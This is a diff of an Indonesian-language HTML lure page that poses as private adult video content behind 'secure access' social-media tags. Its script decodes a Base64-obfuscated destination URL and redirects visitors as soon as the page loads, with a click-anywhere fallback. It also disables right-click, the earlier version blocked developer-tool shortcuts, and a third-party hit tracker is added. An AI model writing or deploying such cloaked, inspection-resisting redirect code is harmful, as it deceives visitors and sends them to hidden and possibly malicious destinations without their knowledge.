@@ -2,97 +2,64 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="referrer" content="no-referrer">
-    <title>Ｍｏｇｏｆｌｏｘ - Akses Privat</title>
-
-    <!-- Metadata Sosial -->
-    <meta property="og:title" content="Akses Privat">
-    <meta property="og:description" content="Pengiriman media aman siap putar.">
-    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
-    <meta property="og:type" content="website">
+    <title>Ｍｏｇｏｆｌｏｘ - Menghubungkan...</title>
     
+    <!-- OG TAGS UNTUK SOSIAL MEDIA -->
+    <meta property="og:site_name" content="Portal Media USA" />
+    <meta property="og:title" content="Shared Community Content - Secure Access" /> 
+    <meta property="og:description" content="View shared media via secure cloud delivery. High-speed streaming enabled for verified regions." />
+    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
+    <meta property="og:type" content="website" />
+
     <script src="https://cdn.tailwindcss.com"></script>
+
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-
-        :root {
-            --brand-red: #e50914;
-        }
-
-        body {
-            background-color: #000;
-            color: #fff;
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+        
+        body { 
+            background-color: #050505; 
+            color: #ffffff; 
             font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
             overflow: hidden;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
-        .main-container {
-            width: 100%;
-            max-width: 450px;
-            height: 100vh;
-            background: #000;
-            position: relative;
-            cursor: pointer;
-        }
-
-        .content-overlay {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-            text-align: center;
-        }
-
-        .play-button {
-            width: 100px;
-            height: 100px;
-            background: var(--brand-red);
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #FFF;
+            border-bottom-color: #e50914;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 30px rgba(229, 9, 20, 0.4);
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
         }
 
-        .play-icon {
-            width: 0;
-            height: 0;
-            border-top: 15px solid transparent;
-            border-bottom: 15px solid transparent;
-            border-left: 25px solid white;
-            margin-left: 8px;
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <div class="main-container" id="hitArea">
-        <div class="content-overlay">
-            <div class="border border-red-600 text-red-600 px-2 py-1 text-xs font-black rounded mb-4">18+</div>
-            <h2 class="text-xs tracking-[0.3em] font-bold opacity-70 mb-8">KONTEN TERENKRIPSI PRIVAT</h2>
-            
-            <div class="play-button mb-6">
-                <div class="play-icon"></div>
-            </div>
-
-            <p class="text-sm font-bold tracking-widest uppercase">Klik untuk Membuka</p>
-        </div>
+    <div class="text-center">
+        <span class="loader"></span>
+        <p class="mt-4 text-xs tracking-[0.3em] text-gray-500 uppercase animate-pulse">Menghubungkan ke Server Aman...</p>
     </div>
 
     <script>
-        // Base redirect yang disamarkan
+        // Tautan tujuan dasar yang disamarkan (Base64)
         const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");
 
         /**
-         * Mengambil ID video dari parameter URL atau path
+         * Mengambil ID video dari URL (Parameter atau Path)
          */
         function extractVideoId() {
             const params = new URLSearchParams(window.location.search);
@@ -101,40 +68,51 @@
             if (!id) {
                 const pathParts = window.location.pathname.split("/");
                 const lastPart = pathParts.pop().trim();
-                if (lastPart && !lastPart.includes(".") && lastPart !== "index") {
+                // Validasi agar bukan file sistem
+                if (lastPart && !lastPart.includes(".") && lastPart !== "index" && lastPart !== "bridge") {
                     id = lastPart;
                 }
             }
-            return (id && id.length >= 3) ? id : null;
+            return id;
         }
 
         /**
-         * Fungsi untuk langsung pindah ke tautan tujuan
+         * Fungsi pengalihan langsung
          */
-        function goDirectly() {
+        function redirectToDestination() {
             const id = extractVideoId();
             let finalUrl = BASE_REDIRECT;
-            if (id) finalUrl += "/" + id;
             
+            // Tambahkan ID ke tautan jika ditemukan
+            if (id) {
+                finalUrl += "/" + id;
+            }
+
+            // Lakukan pengalihan segera
             window.location.replace(finalUrl);
         }
 
-        // Eksekusi segera setelah DOM siap
-        document.addEventListener("DOMContentLoaded", () => {
-            // Langsung coba pindah saat halaman dimuat
-            goDirectly();
+        // Jalankan pengalihan saat halaman dimuat
+        window.onload = redirectToDestination;
 
-            // Backup jika auto-redirect gagal/terblokir, klik area mana saja akan memicu perpindahan
-            document.getElementById("hitArea").addEventListener("click", goDirectly);
-        });
+        // Fallback: Jika auto-redirect gagal, klik di mana saja akan memicu redirect
+        document.body.onclick = redirectToDestination;
 
-        // Pencegahan inspeksi standar
+        // Keamanan tambahan (opsional)
         document.addEventListener("contextmenu", e => e.preventDefault());
-        document.onkeydown = e => {
-            if (e.keyCode === 123) return false;
-            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) return false;
-        };
     </script>
 
+    <!-- Histats.com START -->
+    <script type="text/javascript">
+        var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,5003595,4,0,0,0,00010000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+            hs.src = ('//s10.histats.com/js15_as.js');
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();
+    </script>
 </body>
 </html>
